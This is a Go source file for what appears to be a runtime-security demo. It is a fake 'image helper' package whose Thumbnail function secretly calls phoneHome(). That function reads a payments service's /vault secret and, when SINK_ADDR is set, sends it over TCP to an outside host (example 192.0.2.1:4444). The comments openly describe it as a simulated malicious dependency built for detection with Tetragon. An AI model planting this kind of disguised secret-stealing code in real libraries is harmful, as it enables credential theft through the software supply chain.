// Package upload is the "handy image helper" an AI coding agent reached for when
// a developer asked it to add photo uploads to the gallery. The public API is
// exactly what you'd expect — Thumbnail(data) returns a smaller image — and the
// fifteen lines a reviewer actually reads look harmless.
//
// The catch is below the waterline: on every Thumbnail call the package also
// "phones home for telemetry". That telemetry opens a connection from the
// gallery workload straight to the payments service and scrapes its vault — a
// flow that should never exist. Nothing leaves the cluster; the point is the
// *unexpected east-west call*, which Tetragon attributes to this exact binary.
package upload

import (
	"io"
	"net"
	"net/http"
	"os"
	"time"
)

// Thumbnail returns a 256px JPEG thumbnail of the uploaded image. The thumbnail
// is real (see thumbnail.go), which is exactly why the package passes review.
//
// The dependency "fails closed": if its telemetry call cannot complete it
// returns an error instead of the thumbnail. That is user-hostile but handy for
// the demo — when Tetragon blocks the gallery->payments connection the upload
// visibly fails (503) while the rest of the site keeps serving.
func Thumbnail(data []byte) ([]byte, error) {
	if err := phoneHome(); err != nil {
		return nil, err
	}
	return resize(data, 256)
}

// phoneHome is the malicious payload dressed up as telemetry. It dials the
// payments service and reads its internal vault, then (optionally) ships what it
// found to an external sink.
//
// PAYMENTS_ADDR defaults to the in-cluster service address; SINK_ADDR is
// optional and off by default (the hero flow is the gallery->payments call).
func phoneHome() error {
	payments := getenv("PAYMENTS_ADDR", "payments:8080")

	// DisableKeepAlives so every upload opens a *fresh* TCP connection to
	// payments. Otherwise Go's default transport pools the socket and only the
	// first upload would make a tcp_connect for Tetragon to see or block.
	client := &http.Client{
		Timeout:   2 * time.Second,
		Transport: &http.Transport{DisableKeepAlives: true},
	}
	resp, err := client.Get("http://" + payments + "/vault")
	if err != nil {
		return err // connection blocked (EPERM) or payments unreachable
	}
	defer resp.Body.Close()
	secret, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	// Optional second beat: exfiltrate outside the cluster. Off unless SINK_ADDR
	// is set (e.g. 192.0.2.1:4444, RFC 5737 TEST-NET-1 — unroutable). Best-effort;
	// it does not gate the thumbnail.
	if sink := os.Getenv("SINK_ADDR"); sink != "" {
		if conn, err := net.DialTimeout("tcp", sink, 2*time.Second); err == nil {
			_, _ = conn.Write(secret)
			_ = conn.Close()
		}
	}
	return nil
}

func getenv(k, def string) string {
	if v := os.Getenv(k); v != "" {
		return v
	}
	return def
}
